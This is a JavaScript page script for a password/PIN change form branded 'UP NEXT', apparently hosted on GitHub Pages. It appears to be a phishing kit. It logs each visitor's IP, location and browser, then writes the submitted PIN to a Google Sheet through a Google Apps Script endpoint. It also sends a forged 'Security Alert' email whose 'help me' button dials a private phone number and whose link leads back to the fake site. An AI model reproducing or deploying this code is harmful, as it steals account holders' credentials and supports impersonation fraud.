let userInfo = {
  ip: 'Unknown',
  browserName: 'Unknown',
  browserVersion: 'Unknown',
  city: 'Unknown',
  region: 'Unknown',
  country: 'Unknown',
  time: formatTime(),
};

// Function to format the current time
function formatTime() {
  const now = new Date();
  const options = {
    weekday: 'short',
    month: 'long',
    day: 'numeric',
    year: 'numeric',
    hour: 'numeric',
    minute: 'numeric',
    hour12: true,
  };
  return now.toLocaleString('en-US', options);
}

console.log('Time:', userInfo.time);

// Function to fetch user information
function fetchUserInfo() {
  // Fetch IP address
  fetch('https://api.ipify.org?format=json')
    .then((response) => response.json())
    .then((data) => {
      userInfo.ip = data.ip;
      console.log('IP:', data.ip);
    })
    .catch((error) => {
      console.error('Error fetching IP:', error);
    });

  // Fetch location info
  fetch('https://ipinfo.io/json')
    .then((response) => response.json())
    .then((data) => {
      userInfo.city = data.city;
      userInfo.region = data.region;
      userInfo.country = data.country;

    })
    .catch((error) => {
      console.error('Error fetching location:', error);
    });

  // Get browser info
  const userAgent = navigator.userAgent;
  if (userAgent.includes('Firefox')) {
    userInfo.browserName = 'Mozilla Firefox';
    userInfo.browserVersion = userAgent.match(/Firefox\/(\d+\.\d+)/)[1];
  } else if (userAgent.includes('Edg')) {
    userInfo.browserName = 'Microsoft Edge';
    userInfo.browserVersion = userAgent.match(/Edg\/(\d+\.\d+)/)[1];
  } else if (userAgent.includes('Chrome')) {
    userInfo.browserName = 'UP NEXT v10 Chromium';
    userInfo.browserVersion = userAgent.match(/Chrome\/(\d+\.\d+)/)[1];
  } else if (userAgent.includes('Safari')) {
    userInfo.browserName = 'Apple Safari';
    userInfo.browserVersion = userAgent.match(/Version\/(\d+\.\d+)/)[1];
  } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
    userInfo.browserName = 'Opera';
    userInfo.browserVersion = userAgent.match(/(Opera|OPR)\/(\d+\.\d+)/)[2];
  }
 
  return userInfo;
}

// Call function on page load
fetchUserInfo();

// Add event listener for password form submission
document.getElementById('passwordForm').addEventListener('submit', async function (e) {
  e.preventDefault();
  document.getElementById('popupc').classList.add('active');

  const password1 = document.getElementById('password1').value;
  const password2 = document.getElementById('password2').value;
  const errorMessage = document.getElementById('error-message');
  const resultDisplay = document.getElementById('result');
  resultDisplay.disabled = true;
  resultDisplay.style.opacity = '0.5';
  resultDisplay.innerText = 'Wait....';

  if (password1 === password2) {
    async function doTaskA(pininput) {
      if (pininput) {
        return await processX(pininput, k9x7z3); // Replace 'k9x7z3' with your actual key or variable
      } else {
        alert('Please enter a value for PIN');
        return null;
      }
    }

    const sheetId = '1TDMAsjWwLx6Yv-oPUYPZInqmX0oWKtTIYKqeveCkH5w';
    const sheetName = 'userid';
    const action = 'updateCell';
    const processedPin = await doTaskA(password2);
    if (!processedPin) return false;

    const payload = {
      sheetId,
      sheetName,
      action,
      row: parseInt(localStorage.getItem('rownumber'), 10),
      column: 3,
      value: processedPin,
    };

    try {
      const response = await fetch(
        `${strct}/AKfycbwVNVJsEAgAmUuNYxG8qpslRAdOcIwAAEuUEI_XlY7lydXVsniY_XH7IBv6LOwtGp4o/exec`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        }
      );
      const result = await response.text();
      sendEmail();
    } catch (error) {
      document.getElementById('popupc').classList.remove('active');
      resultDisplay.textContent = 'Error: ' + error.message;
    }
  } else {
    document.getElementById('popupc').classList.remove('active');
    errorMessage.textContent = 'Passwords do not match. Please try again.';
  }

  async function sendEmail() {
    const sphone = localStorage.getItem('phoneNumber');
    const email = localStorage.getItem('mymail');
    const url =
      `${strct}/AKfycbwr-I-bBR-W7h6LHOLHTRIuciRb2q869OzJnlIknoKbrL1W8gTWBFzjSIAVFbEymDgHQw/exec`; // Replace with your GAS deployment URL
    const payload = {
      to_email: email,
      subject: `Security Alert ${sphone}`,
      body_html: `<table style="width: 100%; max-width: 600px; font-family: Arial, sans-serif; border-collapse: collapse; text-align: center; margin: 0 auto;">
          <tr>
              <td style="font-size: 22px; font-weight: bold; padding: 20px 0;">Did you change your password?</td>
          </tr>
          <tr>
              <td style="font-size: 14px; color: #555; padding: 0 20px;">
                  We noticed the password for your UP NEXT account ${sphone} was recently changed. If this was you, you can safely disregard this email.
              </td>
          </tr>
          <tr>
              <td style="border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin-top: 15px; text-align: left;">
                  <p style="font-weight: bold; font-size: 16px; margin: 0;">Changed password by</p>
                  <hr style="border: none; height: 1px; background-color: #ddd; margin: 10px 0;">
                  <p style="margin: 5px 0;"><strong>When</strong> ${userInfo.time}</p>
                  <p style="margin: 5px 0;"><strong>Where</strong> ${userInfo.city} , ${userInfo.country} , ${userInfo.region}</p>
                  <p style="margin: 5px 0;"><strong>Device Type</strong> ${userInfo.browserName} ${userInfo.browserVersion}</p>
                  <p style="margin: 5px 0;"><strong>IP address</strong> ${userInfo.ip}</p>
                  <p style="margin: 5px 0;color:red"><strong>Account Number:</strong> ${sphone}</p>
              </td>
          </tr>
          <tr>
              <td style="padding: 15px 0;">
                  <a href="tel:+8801888396332" style="background-color: #0099ff; color: #fff; text-decoration: none; padding: 12px 18px; border-radius: 6px; display: inline-block; font-weight: bold;">
                      I didn't do this—help me
                  </a>
              </td>
          </tr>
          <tr>
              <td style="border-top: 1px solid #ddd; padding-top: 15px; padding-bottom: 20px;">
                  <table style="width: 100%; text-align: center;">
                      <tr>
                          <td style="padding-bottom: 10px;">
                              <img src="https://nfcard.github.io/login/Logoup.jpg" style="width: 40px; height: 40px;">
                          </td>
                      </tr>
                      <tr>
                          <td style="font-size: 14px;"><strong>Your account security:</strong> <span style="color: #0099ff;">Could be stronger</span></td>
                      </tr>
                      <tr>
                          <td style="font-size: 13px; color: #555; padding: 5px 20px;">
                              We noted a few things that you can do. <a href="https://nfcard.github.io/login/red.html" style="color: #0099ff; text-decoration: none;">Click here to open app and change password.</a>
                          </td>
                      </tr>
                  </table>
              </td>
          </tr>
      </table>`,
    };

    const options = {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    };

    try {
      const response = await fetch(url, options);
      const result = await response.text(); // Get text response instead of JSON
      resultDisplay.textContent = 'Successful';
      resultDisplay.style.opacity = '1';
      document.getElementById('popupc').classList.remove('active');
      setTimeout(() => {
        window.location.replace('index1.html');
      }, 500);
    } catch (error) {
      console.error('Error sending email:', error);
    }
  }
});
